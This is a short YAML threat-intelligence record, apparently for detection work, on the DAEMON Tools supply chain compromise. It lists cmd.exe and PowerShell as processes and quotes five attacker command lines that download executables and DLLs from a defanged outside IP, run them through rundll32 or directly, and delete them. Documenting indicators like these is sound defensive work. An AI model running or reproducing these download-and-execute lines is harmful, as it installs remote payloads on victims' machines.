title: DAEMON Tools Software Supply Chain Attack
description: DAEMON Tools software installers were compromised with a malicious payload,
  affecting thousands of machines across multiple countries.
attribution: ''
malware_families: []
cves: []
ttps:
  processes:
  - cmd.exe
  - powershell.exe
  command_lines:
  - cmd.exe /c powershell -NoProfile -Command "$wc=New-Object System.Net.WebClient;$wc.DownloadFile('http://38.180.107[.]76/<hexadecimal
    string>','C:\Windows\Temp\<filename>.exe')" && %TEMP%\ <filename> <arguments>
    && del %TEMP%\ <filename>.exe
  - cmd.exe /c powershell -NoProfile -Command "$wc=New-Object System.Net.WebClient;$wc.DownloadFile('http://38.180.107[.]76/env_check_script','C:\Windows\Temp\envchk.exe')"
    && C:\Windows\Temp\envchk.exe http://38.180.107[.]76/09505aca4f538bd&&del %TEMP%\envchk.exe
  - cmd.exe /c powershell -NoProfile -Command "$wc=New-Object System.Net.WebClient;$wc.DownloadFile('http://38.180.107[.]76/b3593ac2edb34f4d4d','C:\Windows\Temp\cdg.exe')"
    && powershell -NoProfile -Command "$wc=New-Object System.Net.WebClient;$wc.DownloadFile('http://38.180.107[.]76/368b1365bd9176b359','%TEMP%\cdg.tmp')"
    && %TEMP%\cdg.exe schedsvc.dll %TEMP%\cdg.tmp first_match&&del %TEMP%\cdg.exe&&del
    %TEMP%\cdg.tmp
  - cmd.exe /c powershell -NoProfile -Command "$wc=New-Object System.Net.WebClient;$wc.DownloadFile('http://38.180.107[.]76/407fbb423143f99fe0','C:\ProgramData\Microsoft\mcrypto.chiper')"&&powershell
    -NoProfile -Command "$wc=New-Object System.Net.WebClient;$wc.DownloadFile('http://38.180.107[.]76/07fbb423143f99fe07','$appdata\Microsoft\mcrypto.dat')"&&start
    rundll32.exe $appdata\Microsoft\mcrypto.chiper, mcrypto_clean
  - cmd.exe /c powershell -NoProfile -Command "$wc=New-Object System.Net.WebClient;$wc.DownloadFile('http://38.180.107[.]76/407fbb423143f99fe0','C:\Windows\Temp\crypto.dll')"&&powershell
    -NoProfile -Command "$wc=New-Object System.Net.WebClient;$wc.DownloadFile('http://38.180.107[.]76/07fbb423143f99fe07','$appdata\Microsoft\mcrypto.dat')"&&start
    rundll32.exe %TEMP%\rypto.dll, mcrypto_clean
